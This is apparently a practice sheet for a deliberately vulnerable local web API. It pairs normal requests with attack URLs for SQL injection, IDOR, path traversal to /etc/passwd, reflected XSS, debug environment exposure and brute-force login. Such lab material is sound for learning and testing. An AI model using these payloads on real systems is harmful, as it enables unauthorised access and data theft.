1. SQL Injection
Regular request:
http://localhost:8080/api/user/search?username=admin
Attack:
http://localhost:8080/api/user/search?username=admin'+OR+'1'='1

2. IDOR - ID iteration
Standard request:
http://localhost:8080/api/user/profile/1
Attack:
http://localhost:8080/api/user/profile/2
http://localhost:8080/api/user/profile/1+OR+1=1

3. Path Traversal (LFI)
Standard request:
http://localhost:8080/api/user/download?file=test.txt
Attack:
http://localhost:8080/api/user/download?file=../../../../../../../../etc/passwd

4. XSS Cross-Site Scripting (XSS)
Standard request:
http://localhost:8080/api/user/greet?name=Shermat
Attack:
http://localhost:8080/api/user/greet?name=<script>alert('XSS')</script>

5. Information Exposure
http://localhost:8080/api/user/debug/env

6. Brute-Force / Broken Auth
Standard:
http://localhost:8080/api/user/login?username=admin&password=wrongpassword
Attack:
curl -X POST "http://localhost:8080/api/user/login?username=admin&password=123456"